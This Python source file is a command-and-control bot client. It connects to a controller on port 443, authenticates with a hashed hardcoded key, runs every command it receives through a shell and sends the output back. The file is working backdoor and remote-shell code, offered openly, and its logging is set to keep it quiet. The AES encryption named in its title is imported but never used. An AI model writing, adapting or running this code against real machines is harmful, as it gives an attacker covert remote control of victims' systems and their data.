
##Pure CNC Client With AES Encryption




""""
Command and Control Bot
Server Code
Python 3 Environment
Author: Harris
harrisjnu@gmail.com
"""

#Logging
import logging
LEVELS = { 'debug':logging.DEBUG,
            'info':logging.INFO,
            'warning':logging.WARNING,
            'error':logging.ERROR,
            'critical':logging.CRITICAL,
            }
level_name = 'critical'
level = LEVELS.get(level_name, logging.NOTSET)
logging.basicConfig(level=level)

#Imports
import socket, os, sys, subprocess, hashlib
from Crypto.Cipher import AES

#Variables
controller = "127.0.0.1"
port = 443
c_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def auth():
    authkey = b"passkey"
    authkey = hashlib.sha1(authkey)
    authkey = authkey.hexdigest()
    c_socket.send(authkey.encode())

def connect():
    try:
        logging.debug("Connecting to controller.....")
        c_socket.connect((controller,port))
        logging.debug("Connection established with the controller")
    except:
        logging.debug("Unable to establish controller connectivity")

    #AUTHENTICATION MODULE
    auth()
    ## AUTH MODULE END

def recieve():
    while True:
        try:
            cmd = c_socket.recv(1024)
            logging.debug(cmd)
            cmd = cmd.decode()
            cmd = str(cmd)
            if cmd == '':
                main()
            execution = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            std_out = execution.stdout.read() + execution.stderr.read()
            logging.debug(std_out)

            c_socket.send(std_out)
        except:
            pass

def main():
    connect()
    while True:
        recieve()

main()